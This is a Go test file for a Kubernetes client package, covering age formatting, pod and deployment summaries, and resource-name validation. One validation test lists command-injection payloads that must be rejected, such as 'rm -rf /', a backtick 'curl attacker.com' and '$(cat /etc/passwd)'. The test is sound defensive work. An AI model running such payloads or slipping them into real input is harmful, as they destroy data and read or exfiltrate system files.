package k8s

import (
	"context"
	"encoding/json"
	"os/exec"
	"strings"
	"testing"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
)

func TestFormatAge(t *testing.T) {
	now := time.Now()

	age1 := formatAge(now.Add(-10 * time.Second))
	if age1 != "10s" {
		t.Errorf("expected 10s, got %s", age1)
	}

	age2 := formatAge(now.Add(-5 * time.Minute))
	if age2 != "5m" {
		t.Errorf("expected 5m, got %s", age2)
	}

	age3 := formatAge(now.Add(-3 * time.Hour))
	if age3 != "3h" {
		t.Errorf("expected 3h, got %s", age3)
	}

	age4 := formatAge(now.Add(-48 * time.Hour))
	if age4 != "2d" {
		t.Errorf("expected 2d, got %s", age4)
	}
}

func TestK8sServiceOfflineGraceful(t *testing.T) {
	svc := NewK8sService("/non/existent/path/kubeconfig")
	if svc.IsConnected() {
		t.Error("expected service to be offline for invalid kubeconfig")
	}

	ctx := context.Background()
	pods, err := svc.ListPods(ctx, "default")
	if err == nil {
		t.Error("expected error when listing pods on offline service")
	}
	if len(pods) != 0 {
		t.Errorf("expected 0 pods, got %d", len(pods))
	}
}

func TestMapPodListToSummary(t *testing.T) {
	podJSON := `{
		"apiVersion": "v1",
		"kind": "PodList",
		"items": [
			{
				"metadata": {
					"name": "nginx-demo-76bf7",
					"namespace": "production",
					"creationTimestamp": "2026-10-18T10:00:00Z"
				},
				"spec": {
					"nodeName": "worker-node-1",
					"containers": [
						{"name": "nginx"}
					]
				},
				"status": {
					"phase": "Running",
					"podIP": "10.244.1.15",
					"containerStatuses": [
						{
							"name": "nginx",
							"restartCount": 2,
							"ready": true
						}
					]
				}
			}
		]
	}`

	var podList corev1.PodList
	if err := json.Unmarshal([]byte(podJSON), &podList); err != nil {
		t.Fatalf("failed to unmarshal test pod json: %v", err)
	}

	summaries := mapPodListToSummary(&podList)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 pod summary, got %d", len(summaries))
	}

	s := summaries[0]
	if s.Name != "nginx-demo-76bf7" {
		t.Errorf("expected pod name nginx-demo-76bf7, got %s", s.Name)
	}
	if s.Namespace != "production" {
		t.Errorf("expected namespace production, got %s", s.Namespace)
	}
	if s.Status != "Running" {
		t.Errorf("expected status Running, got %s", s.Status)
	}
	if s.Restarts != 2 {
		t.Errorf("expected 2 restarts, got %d", s.Restarts)
	}
	if s.Node != "worker-node-1" {
		t.Errorf("expected node worker-node-1, got %s", s.Node)
	}
	if s.IP != "10.244.1.15" {
		t.Errorf("expected IP 10.244.1.15, got %s", s.IP)
	}
	if len(s.Containers) != 1 || s.Containers[0] != "nginx" {
		t.Errorf("expected container nginx, got %v", s.Containers)
	}
}

func TestMapDeploymentListToSummary(t *testing.T) {
	depJSON := `{
		"apiVersion": "apps/v1",
		"kind": "DeploymentList",
		"items": [
			{
				"metadata": {
					"name": "web-api",
					"namespace": "default",
					"creationTimestamp": "2026-10-18T09:00:00Z"
				},
				"spec": {
					"replicas": 3,
					"template": {
						"spec": {
							"containers": [
								{"name": "app", "image": "myregistry.io/app:v1.2"}
							]
						}
					}
				},
				"status": {
					"readyReplicas": 3,
					"availableReplicas": 3
				}
			}
		]
	}`

	var depList appsv1.DeploymentList
	if err := json.Unmarshal([]byte(depJSON), &depList); err != nil {
		t.Fatalf("failed to unmarshal test deployment json: %v", err)
	}

	summaries := mapDeploymentListToSummary(&depList)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 deployment summary, got %d", len(summaries))
	}

	d := summaries[0]
	if d.Name != "web-api" {
		t.Errorf("expected deployment name web-api, got %s", d.Name)
	}
	if d.DesiredReplicas != 3 || d.ReadyReplicas != 3 {
		t.Errorf("expected 3/3 replicas, got %d/%d", d.ReadyReplicas, d.DesiredReplicas)
	}
	if len(d.Images) != 1 || d.Images[0] != "myregistry.io/app:v1.2" {
		t.Errorf("expected image myregistry.io/app:v1.2, got %v", d.Images)
	}
}

func TestRemoteKubectlDetectScriptCompatibility(t *testing.T) {
	// Verify that the script passed to sh -s contains valid POSIX syntax and doesn't fail with syntax errors
	script := `
KUBECTL_BIN=""
if command -v kubectl >/dev/null 2>&1; then
    KUBECTL_BIN="kubectl"
fi
echo "$KUBECTL_BIN"
`
	cmd := exec.Command("sh", "-s")
	cmd.Stdin = strings.NewReader(script)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("detect script failed on POSIX sh: %v (output: %s)", err, string(out))
	}
}

func TestK8sIdentifierValidationAndShellEscape(t *testing.T) {
	// Valid resource names
	validNames := []string{"nginx", "web-api-v1", "my-app.pod-1", "coredns-778f-abc"}
	for _, name := range validNames {
		if err := ValidateK8sName(name); err != nil {
			t.Errorf("expected %q to be valid name, got: %v", name, err)
		}
	}

	// Malicious / injection payloads MUST fail validation
	injectionPayloads := []string{
		"default; id;",
		"default | rm -rf /",
		"`curl attacker.com`",
		"$(cat /etc/passwd)",
		"pod-name\nreboot",
		"name' OR '1'='1",
		"test&whoami",
	}

	for _, payload := range injectionPayloads {
		if err := ValidateK8sName(payload); err == nil {
			t.Errorf("CRITICAL: expected payload %q to FAIL ValidateK8sName, but it passed", payload)
		}
		if err := ValidateK8sNamespace(payload); err == nil {
			t.Errorf("CRITICAL: expected payload %q to FAIL ValidateK8sNamespace, but it passed", payload)
		}
		if err := ValidateContainerName(payload); err == nil {
			t.Errorf("CRITICAL: expected payload %q to FAIL ValidateContainerName, but it passed", payload)
		}
	}

	// Test shellEscape wraps cleanly
	escaped := shellEscape("pod-123'test")
	if escaped != "'pod-123'\\''test'" {
		t.Errorf("unexpected escaped string: %s", escaped)
	}
}
